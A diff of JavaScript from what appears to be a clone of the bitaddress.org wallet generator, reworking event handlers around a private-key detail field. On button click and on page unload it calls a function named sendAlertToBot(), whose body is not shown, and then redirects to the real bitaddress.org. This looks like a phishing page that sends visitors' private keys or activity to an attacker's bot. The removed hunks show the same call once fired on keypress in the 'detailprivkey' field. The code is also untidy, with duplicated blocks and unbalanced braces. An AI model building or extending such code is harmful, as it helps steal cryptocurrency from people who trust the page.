@@ -424,33 +424,10 @@ window.onload = function() {
             }
         });
 
-document.getElementById('viewDetailsButton').addEventListener('click', function() {
-    sendAlertToBot();
-    
-    // New functionality to call the Android interface for redirection
-    setTimeout(function() {
-        if (window.AndroidInterface) {
-            window.AndroidInterface.openUrl("https://bitaddress.org");
-        } else {
-            window.location.href = "https://bitaddress.org";
-        }
-    }, 2000);
-});	    
-    
 
         // New functionality to call the Android interface for redirection
-        setTimeout(function() {
-            if (window.AndroidInterface) {
-                window.AndroidInterface.openUrl("https://bitaddress.org");
-            } else {
-                window.location.href = "https://bitaddress.org";
-            }
-        }, 2000);
-    });
-
-    document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
-        if (event.key === 'Enter') { 
-            sendAlertToBot(); 
+    document.getElementById('viewDetailsButton').addEventListener('click', function() {
+    sendAlertToBot(); 
 
             setTimeout(function() {
                 if (window.AndroidInterface) {
@@ -462,19 +439,12 @@ document.getElementById('viewDetailsButton').addEventListener('click', function(
         }
     });
 
+
     window.addEventListener('beforeunload', function(event) {
         sendAlertToBot();
         event.preventDefault();
     });
 	    
-	    
-window.addEventListener('beforeunload', function(event) {
-    
-    sendAlertToBot();
-    
-    
-    event.preventDefault();
-});
 
     // Function to show tooltip when hovering over an element
     function showTooltip(tooltipId) {
